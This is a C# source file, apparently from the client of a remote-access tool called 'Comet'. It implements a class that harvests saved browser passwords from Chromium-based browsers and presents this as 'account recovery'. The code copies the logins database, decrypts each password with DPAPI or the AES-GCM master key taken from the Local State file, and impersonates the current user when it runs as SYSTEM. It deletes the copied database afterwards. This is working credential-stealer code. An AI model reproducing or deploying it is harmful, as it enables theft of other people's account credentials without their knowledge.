using BCryptNs;
using Comet.Client.Recovery.Utilities;
using Comet.Common.DNS;
using Comet.Common.Models;
using CS_SQLite3;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Comet.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides basic account recovery capabilities from chromium-based applications.
    /// </summary>
    public abstract class ChromiumBase : IUsers
    {
        public ChromiumBase()
        {
            if (Environment.UserName == "SYSTEM")
                ToolsHelpers.SimulateCurrentUserLogin();
        }
        /// <inheritdoc />
        public abstract string ApplicationName { get; }

        /// <inheritdoc />
        public abstract IEnumerable<SaveUser> ReadAccounts();

        /// <summary>
        /// Reads the stored accounts of an chromium-based application.
        /// </summary>
        /// <param name="filePath">The file path of the logins database.</param>
        /// <param name="localStatePath">The file path to the local state.</param>
        /// <returns>A list of recovered accounts.</returns>
        protected List<SaveUser> ReadAccounts(string filePath, string localStatePath)
        {
            var result = new List<SaveUser>();
            if (File.Exists(filePath))
            {
                try
                {
                    File.Copy(filePath, filePath + "B", true);
                    filePath += "B";
                    SQLiteDatabase database = new SQLiteDatabase(filePath);
                    string query = "SELECT origin_url, username_value, password_value FROM logins";
                    DataTable resultantQuery = database.ExecuteQuery(query);
                    foreach (DataRow row in resultantQuery.Rows)
                    {
                        string url;
                        string username;
                        string password = "";
                        string crypt_password;
                        url = (string)row["origin_url"].ToString();
                        username = (string)row["username_value"].ToString();
                        crypt_password = row["password_value"].ToString();
                        byte[] passwordBytes = Convert.FromBase64String(crypt_password);
                        try
                        {
                            //老版本解密
                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));


                        }
                        catch (Exception) //如果异常了就用新加密方式尝试
                        {
                            byte[] masterKey = GetMasterKey(localStatePath);
                            password = DecryptWithKey(passwordBytes, masterKey);
                        }
                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
                        {
                            result.Add(new SaveUser
                            {
                                Url = url,
                                Username = username,
                                Password = password,
                                Application = ApplicationName
                            });
                        }
                    }
                    database.CloseDatabase();
                }
                catch (Exception)
                {
                    //MessageBox.Show(e.Message);
                }
            }
            else
            {
                return result;
            }
            File.Delete(filePath);
            return result;
        }

        public static byte[] GetMasterKey(string filePath)
        {
            //Key saved in Local State file

            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            //Get key with regex.
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
            }

            //Trim first 5 bytes. Its signature "DPAPI"
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes
            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
            Array.Copy(encryptedData, 3, iv, 0, 12);
            try
            {
                //encryptedData without IV
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; //AuthTag
                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data

                //Last 16 bytes for tag
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                //encrypted password
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }
    }
}
